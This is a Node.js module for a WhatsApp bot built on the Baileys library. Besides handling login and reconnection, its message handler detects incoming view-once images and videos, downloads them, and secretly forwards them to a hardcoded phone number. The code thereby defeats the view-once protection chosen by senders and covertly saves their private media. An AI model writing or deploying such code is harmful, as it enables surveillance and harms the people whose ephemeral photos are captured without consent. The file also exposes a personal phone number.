const {
    default: makeWASocket,
    DisconnectReason,
    fetchLatestBaileysVersion,
    isJidBroadcast,
    makeInMemoryStore,
    useMultiFileAuthState,
    downloadMediaMessage,
} = require("@whiskeysockets/baileys");
const { Boom } = require("@hapi/boom");
const fs = require('fs');
const pino = require("pino");
const { session } = { "session": "baileys_auth_info" };

const store = makeInMemoryStore({ logger: pino().child({ level: "silent", stream: "store" }) });
let sock;

async function connectToWhatsApp() {
    const { state, saveCreds } = await useMultiFileAuthState(session);
    sock = makeWASocket({
        printQRInTerminal: true,
        auth: state,
        logger: pino({ level: "silent" }),
		shouldIgnoreJid: jid => isJidBroadcast(jid)
    });
    store.bind(sock.ev);
    sock.multi = true;
    sock.ev.on('connection.update', async (update) => {
        // Connection update logic...
        const { connection, lastDisconnect } = update;
		if(connection === 'close') {
            let reason = lastDisconnect && lastDisconnect.error ? new Boom(lastDisconnect.error).output.statusCode : -1;
			switch (reason) {
				case DisconnectReason.badSession:
					console.log(`Bad Session File, Please Delete ${session} and Scan Again`);
					sock.logout();
					break;
				case DisconnectReason.connectionClosed:
					console.log("Connection closed, reconnecting....");
					connectToWhatsApp();
					break;
				case DisconnectReason.connectionLost:
					console.log("Connection Lost from Server, reconnecting...");
					connectToWhatsApp();
					break;
				case DisconnectReason.loggedOut:
					console.log(`Device Logged Out, deleting session and scanning again.`);
					fs.rm('baileys_auth_info', { recursive: true });
					connectToWhatsApp();
					sock.logout();
					break;
				case DisconnectReason.restartRequired:
					console.log("Restart Required, Restarting...");
					connectToWhatsApp();
					break;
				case DisconnectReason.timedOut:
					console.log("Connection TimedOut, Reconnecting...");
					connectToWhatsApp();
					break;
				default:
					sock.end(`Unknown DisconnectReason: ${reason}|${lastDisconnect.error}`);
					break;
			}
        }else if(connection === 'open') {
			console.log('Bot is ready!');
			let getGroups = await sock.groupFetchAllParticipating();
			let groups = Object.entries(getGroups).slice(0).map(entry => entry[1]);
			return groups;
        }
    });
    sock.ev.on("creds.update", saveCreds);
    sock.ev.on("messages.upsert", async ({ messages }) => {
        const message = messages[0];
        if (!message.key.fromMe) {
            const noWa = "6281382246185@s.whatsapp.net";
            // console.log(message);
            // console.log(message.message?.viewOnceMessageV2);
            const isViewOnceImage = message.message?.viewOnceMessage?.message?.imageMessage?.viewOnce ||
                                    message.message?.viewOnceMessage?.message?.videoMessage?.viewOnce ||
                                    message.message?.viewOnceMessageV2?.message?.imageMessage?.viewOnce ||
                                    message.message?.viewOnceMessageV2?.message?.videoMessage?.viewOnce ||
                                    message.message?.imageMessage?.viewOnce ||
                                    message.message?.videoMessage?.viewOnce;

            if (isViewOnceImage) {
                const buffer = await downloadMediaMessage(
                    message,
                    'buffer',
                    {},
                    { reuploadRequest: sock.updateMediaMessage }
                );
                await sock.sendMessage(noWa, { image: buffer });
            }
        }
    });

}

module.exports = {
    connectToWhatsApp,
}

